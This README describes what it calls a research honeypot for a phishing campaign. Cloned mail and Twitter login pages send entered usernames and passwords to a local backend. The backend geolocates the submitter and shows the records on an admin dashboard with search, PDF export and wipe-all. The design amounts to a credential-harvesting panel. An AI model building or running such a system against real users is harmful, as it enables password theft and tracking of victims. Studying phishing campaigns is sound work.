# PodStream honeypot backend (local research tool)

A backend + SQLite database + admin dashboard for studying the
PodStream phishing campaign. The two clone login pages
([user/index_mail.html](../user/index_mail.html) and
[user/index_twitter.html](../user/index_twitter.html)) submit what a victim
enters to this backend instead of the attacker's Telegram bot, so a researcher
can analyze the campaign's submissions — username, password, IP, country, and
city — from one dashboard.

> 

## What you get

- `POST /api/capture` — records a submission (username, password, method, IP,
  user-agent, referrer). Country/city are resolved automatically via
  [ip-api.com](https://ip-api.com) (free, no key) with an in-DB cache.
- `GET /api/admin/summary` — totals, unique usernames/IPs, country/city/method
  breakdowns, recent rows.
- `GET /api/admin/submissions?q=...` — searchable list (latest 200).
- `DELETE /api/admin/submissions/:id` — remove a row.
- `DELETE /api/admin/submissions` — delete **all** records (the dashboard's
  **Clear all records** button; double-confirmed in the UI).
- `GET /api/admin/export-pdf` — download all captured records as a PDF (the
  dashboard's **Save PDF** button).
- `GET /api/admin/geo/:ip` — manual IP lookup for research/testing.
- `POST /api/admin/change-key` — rotate the admin key (authenticated with the
  **current** key; body `{ "newKey": "..." }`, min 8 chars).
- A browser **admin dashboard** at `/admin` with stats, live table, search, and
  delete, plus a **Change admin key** tool (with a random-key generator).
- The static site (landing page + clones) is served from the same origin.

## Quick start

```bash
cd backend
npm install
npm start
```

Open:

- Dashboard: http://127.0.0.1:3000/admin
- Landing page: http://127.0.0.1:3000/indexpage.html
- Clone pages: http://127.0.0.1:3000/user/index_mail.html and
  http://127.0.0.1:3000/user/index_twitter.html

The admin key is printed in the server console on start (persisted in
`data/.admin-key`; override with `ADMIN_KEY` in a `.env` file — see
`.env.example`). Enter it on the dashboard's **Admin key** card.

**Changing the key:** use the **Change admin key** section on the dashboard (or
`POST /api/admin/change-key`). The new key is written to `data/.admin-key` and
takes effect immediately. Note: if `ADMIN_KEY` is set in the environment, that
value wins again after a restart — the dashboard will warn you when this is the
case.

## Testing the flow

1. Start the server.
2. Open http://127.0.0.1:3000/user/index_mail.html and submit any email +
   passcode.
3. The submission is POSTed to `http://127.0.0.1:3000/api/capture` (the page
   shows a fallback message if the backend isn't running).
4. Watch it appear in the dashboard (auto-refreshes every 5s).

You can also POST directly:

```bash
curl -X POST http://127.0.0.1:3000/api/capture \
  -H "Content-Type: application/json" \
  -d '{"username":"a@b.com","password":"secret","method":"email","ip":"8.8.8.8"}'
```

## Geolocation notes

- Private/local IPs (`127.x`, `10.x`, `192.168.x`, `172.16-31.x`, `::1`) are
  labeled `Private` without a lookup.
- Lookups go to `http://ip-api.com` (free tier, ~45 req/min). Results are
  cached in the `geo_cache` table; failures degrade to `Unknown`.
- For testing with a realistic external IP, pass `ip` explicitly in the POST
  body (as above) — the admin dashboard's **Look up my IP** button shows your
  own public IP for reference.

## API quick reference

| Method | Path                      | Auth           | Purpose                              |
| ------ | ------------------------- | -------------- | ------------------------------------ |
| POST   | `/api/capture`            | none           | Record a submission                  |
| GET    | `/api/health`             | none           | Health check                         |
| GET    | `/api/admin/summary`      | `X-Admin-Key`  | Stats + breakdowns                   |
| GET    | `/api/admin/submissions`  | `X-Admin-Key`  | List/search submissions              |
| DELETE | `/api/admin/submissions/:id` | `X-Admin-Key` | Delete a submission                |
| GET    | `/api/admin/geo/:ip`      | `X-Admin-Key`  | Geolocate an IP                      |
| POST   | `/api/admin/change-key`   | `X-Admin-Key`  | Rotate the admin key                 |
| DELETE | `/api/admin/submissions`  | `X-Admin-Key`  | Delete all records                   |
| GET    | `/api/admin/export-pdf`   | `X-Admin-Key`  | Download records as a PDF            |

## Layout

```
backend/
  package.json
  .env.example
  src/
    server.js            Express app, mounts API + static site
    config.js            port, host, db path, admin key
    db.js                SQLite schema (submissions, geo_cache)
    geo.js               ip-api.com geolocation + cache
    middleware/requireAdmin.js
    routes/capture.js
    routes/admin.js
  public/admin/index.html   Admin dashboard
  data/                    (created at runtime — sqlite + admin key)
```

